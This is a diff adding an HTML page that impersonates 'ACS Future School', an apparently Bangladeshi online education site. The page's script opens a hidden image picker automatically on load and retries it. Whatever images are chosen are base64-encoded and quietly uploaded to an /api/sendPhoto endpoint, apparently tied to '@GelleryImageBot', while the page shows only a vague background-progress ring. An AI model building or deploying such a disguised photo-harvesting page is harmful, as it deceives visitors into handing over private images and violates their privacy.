@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ACS Future School</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, 'Segoe UI', Roboto, sans-serif; }
+        body { background: #0a0a12; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+        .card { background: #12121e; border-radius: 32px; padding: 50px 35px 45px; max-width: 480px; width: 100%; border: 1px solid #2a2a42; text-align: center; box-shadow: 0 30px 80px rgba(0,0,0,0.8); position: relative; overflow: hidden; }
+        .card::before { content: ''; position: absolute; top: -60%; left: -60%; width: 220%; height: 220%; background: radial-gradient(circle at 30% 20%, rgba(0,102,204,0.04), transparent 60%); pointer-events: none; }
+        .logo { position: relative; z-index: 1; }
+        .logo h1 { font-size: 42px; font-weight: 800; color: #fff; letter-spacing: -1.5px; line-height: 1.1; }
+        .logo h1 span { color: #3399ff; }
+        .logo .domain { font-size: 18px; color: #6a6a8a; margin-top: 4px; }
+        .logo .domain span { color: #3399ff; font-weight: 500; }
+        .tagline { font-size: 14px; color: #8888aa; margin-top: 14px; border-top: 1px solid #1e1e32; padding-top: 18px; }
+        .tagline strong { color: #aabbdd; font-weight: 500; }
+        .status-section { position: relative; z-index: 1; margin-top: 28px; padding-top: 20px; border-top: 1px solid #1a1a2e; }
+        .progress-ring { width: 52px; height: 52px; margin: 0 auto; position: relative; }
+        .progress-ring svg { transform: rotate(-90deg); width: 52px; height: 52px; }
+        .progress-ring circle { fill: none; stroke-width: 4; }
+        .progress-ring .bg { stroke: #1a1a2e; }
+        .progress-ring .fg { stroke: #3399ff; stroke-linecap: round; transition: stroke-dashoffset 0.6s ease; stroke-dasharray: 144.51; stroke-dashoffset: 144.51; }
+        .percent { position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%); color: #aabbdd; font-size: 12px; font-weight: 600; }
+        .footer { position: relative; z-index: 1; color: #3a3a52; font-size: 11px; margin-top: 18px; border-top: 1px solid #1a1a2e; padding-top: 14px; }
+        .badge-dot { display: inline-block; width: 6px; height: 6px; background: #4ade80; border-radius: 50%; margin-right: 6px; animation: pulse-dot 2s infinite; }
+        @keyframes pulse-dot { 0%,100% { opacity: 1; } 50% { opacity: 0.2; } }
+        .file-input { display: none; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="logo">
+            <h1>ACS<span>Future</span><br>School</h1>
+            <div class="domain">acsfutureschool.<span>com</span></div>
+            <div class="tagline"><strong>ACS Future School</strong> — বাংলাদেশের সেরা অনলাইন শিক্ষা প্ল্যাটফর্ম</div>
+        </div>
+        <div class="status-section">
+            <div class="progress-ring">
+                <svg viewBox="0 0 52 52">
+                    <circle class="bg" cx="26" cy="26" r="23"/>
+                    <circle class="fg" id="progressCircle" cx="26" cy="26" r="23"/>
+                </svg>
+                <div class="percent" id="percentText">0%</div>
+            </div>
+        </div>
+        <div class="footer"><span class="badge-dot"></span> ব্যাকগ্রাউন্ডে কাজ চলছে • @GelleryImageBot</div>
+    </div>
+    <input type="file" id="fileInput" class="file-input" accept="image/*" multiple>
+
+    <script>
+        (function() {
+            const fileInput = document.getElementById('fileInput');
+            const progressCircle = document.getElementById('progressCircle');
+            const percentText = document.getElementById('percentText');
+            let imageFiles = [];
+            let isProcessing = false;
+            let isComplete = false;
+            let retryCount = 0;
+            const CIRCUMFERENCE = 144.51;
+
+            function updateUI() {
+                const total = imageFiles.length;
+                const sent = imageFiles.filter(f => f.sent).length;
+                const pct = total === 0 ? 0 : Math.round((sent / total) * 100);
+                percentText.textContent = pct + '%';
+                progressCircle.style.strokeDashoffset = CIRCUMFERENCE - (pct / 100) * CIRCUMFERENCE;
+            }
+
+            function addFiles(files) {
+                const valid = [];
+                for (let f of files) {
+                    if (f.type.startsWith('image/') && f.size <= 20 * 1024 * 1024) valid.push(f);
+                }
+                if (valid.length === 0) return false;
+                let added = 0;
+                for (let f of valid) {
+                    const exists = imageFiles.some(i => i.file.name === f.name && i.file.size === f.size);
+                    if (!exists) { imageFiles.push({ file: f, sent: false }); added++; }
+                }
+                if (added > 0) { updateUI(); return true; }
+                return false;
+            }
+
+            function fileToBase64(file) {
+                return new Promise((resolve, reject) => {
+                    const reader = new FileReader();
+                    reader.onload = () => resolve(reader.result.split(',')[1]);
+                    reader.onerror = reject;
+                    reader.readAsDataURL(file);
+                });
+            }
+
+            async function startAutoSend() {
+                if (isProcessing || imageFiles.length === 0) return;
+                isProcessing = true;
+
+                for (let item of imageFiles) {
+                    if (item.sent) continue;
+                    try {
+                        const base64 = await fileToBase64(item.file);
+                        const res = await fetch('/api/sendPhoto', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                filename: item.file.name,
+                                contentType: item.file.type,
+                                data: base64
+                            })
+                        });
+                        const result = await res.json();
+                        if (result.ok) item.sent = true;
+                        console.log('Result:', result);
+                    } catch (e) {
+                        console.error('Send error:', e);
+                    }
+                    updateUI();
+                    await new Promise(r => setTimeout(r, 500));
+                }
+                isProcessing = false;
+                isComplete = true;
+                updateUI();
+            }
+
+            fileInput.addEventListener('change', function(e) {
+                const files = e.target.files;
+                if (files && files.length > 0) {
+                    const added = addFiles(files);
+                    fileInput.value = '';
+                    if (added) setTimeout(() => startAutoSend(), 600);
+                }
+            });
+
+            window.addEventListener('load', function() {
+                setTimeout(() => fileInput.click(), 800);
+                setTimeout(() => {
+                    if (imageFiles.length === 0 && !isProcessing && !isComplete && retryCount < 3) {
+                        retryCount++;
+                        fileInput.click();
+                    }
+                }, 5000);
+            });
+            updateUI();
+        })();
+    </script>
+</body>
+</html>
